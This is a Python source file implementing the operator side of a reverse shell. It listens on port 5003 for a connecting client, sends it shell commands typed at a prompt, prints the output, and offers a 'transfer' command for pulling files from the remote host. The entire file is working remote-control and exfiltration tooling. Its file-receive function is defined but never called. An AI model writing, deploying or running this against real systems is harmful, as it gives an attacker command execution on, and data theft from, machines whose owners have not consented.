import socket
import os
#from dotenv import load_dotenv
import sys
#load_dotenv()

#SERVER_HOST = os.getenv('SERVER_HOST')
SERVER_HOST=        sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

def recvfile():
    filename = client_socket.recv(BUFFER_SIZE).decode()
    filename = os.path.basename(filename)
    with open(filename, 'wb') as f:
        while True:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:
                break
            f.write(bytes_read) 
while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    elif command.lower() == "clear":
        
        os.system('clear')
        continue
   
    elif command.lower() == "help":
        print("clear - clear the screen")
        print("exit - exit the program")
        print("help - show this help message")
        print("show - show the current directory")
        continue
    
    elif command.lower().startswith("transfer"):
        filename = command.split()[1]
        client_socket.send(command.encode())  
    else:
        client_socket.send(command.encode())  
      
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
